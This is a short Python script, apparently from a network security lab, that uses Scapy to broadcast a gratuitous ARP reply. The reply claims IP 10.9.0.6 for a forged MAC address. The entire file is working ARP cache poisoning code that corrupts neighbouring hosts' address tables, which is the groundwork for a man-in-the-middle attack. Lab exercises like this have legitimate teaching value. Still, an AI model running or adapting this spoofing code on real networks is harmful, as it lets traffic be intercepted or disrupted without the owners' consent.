#!/usr/bin/env python3
from scapy.all import *

E = Ether()
A = ARP()

E.dst = 'ff:ff:ff:ff:ff:ff'

# 1 for ARP request
# 2 for ARP reply
A.op = 2

A.hwsrc = '02:42:0a:09:00:69'
A.psrc = '10.9.0.6'
A.hwdst = 'ff:ff:ff:ff:ff:ff'
A.pdst = '10.9.0.6'

pkt = E/A
sendp(pkt)